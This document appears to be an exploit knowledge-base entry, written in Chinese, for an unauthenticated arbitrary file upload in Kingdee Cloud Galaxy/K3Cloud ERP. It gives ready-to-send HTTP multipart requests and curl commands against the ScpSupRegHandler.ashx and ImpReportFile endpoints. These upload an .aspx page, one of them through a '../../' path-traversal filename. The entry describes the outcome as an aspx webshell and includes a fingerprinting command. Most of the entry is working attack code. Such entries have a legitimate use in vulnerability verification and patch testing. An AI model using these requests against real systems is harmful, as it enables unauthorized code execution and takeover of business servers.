---
id: KINGDEE-CLOUD-UPLOAD
title: 金蝶云星空 ScpSupRegHandler/ImpReportFile 任意文件上传
product: kingdee
vendor: 金蝶软件
version_affected: "云星空, K3Cloud"
severity: CRITICAL
tags: [rce, file_upload, 无需认证, 国产, erp]
fingerprint: ["金蝶", "Kingdee", "K3Cloud", "云星空", "ScpSupRegHandler", "ImpReportFile"]
---

## 漏洞描述

金蝶云星空/K3Cloud 的 ScpSupRegHandler 和 ImpReportFile 接口存在未授权文件上传漏洞，可上传 aspx webshell。

## 影响版本

- 云星空
- K3Cloud

## 前置条件

- 无需认证，目标开放 `/K3Cloud/ScpSupRegHandler.ashx` 或 `ImpReportFile.common.kdsvc` 接口

## 利用步骤

### ScpSupRegHandler 文件上传

```http
POST /K3Cloud/ScpSupRegHandler.ashx HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../test.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %><%Response.Write("vuln_test");%>
------WebKitFormBoundary--
```

### ImpReportFile 文件上传

```http
POST /K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.ImpReportFile.common.kdsvc HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %><%Response.Write("vuln_test");%>
------WebKitFormBoundary--
```

## Payload

ScpSupRegHandler 上传：

```bash
curl -X POST "http://target/K3Cloud/ScpSupRegHandler.ashx" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@test.aspx;filename=../../test.aspx"
```

ImpReportFile 上传：

```bash
curl -X POST "http://target/K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.ImpReportFile.common.kdsvc" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@test.aspx;filename=test.aspx"
```

## 验证方法

上传后访问 webshell 路径确认执行。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" "http://target/K3Cloud/"
```
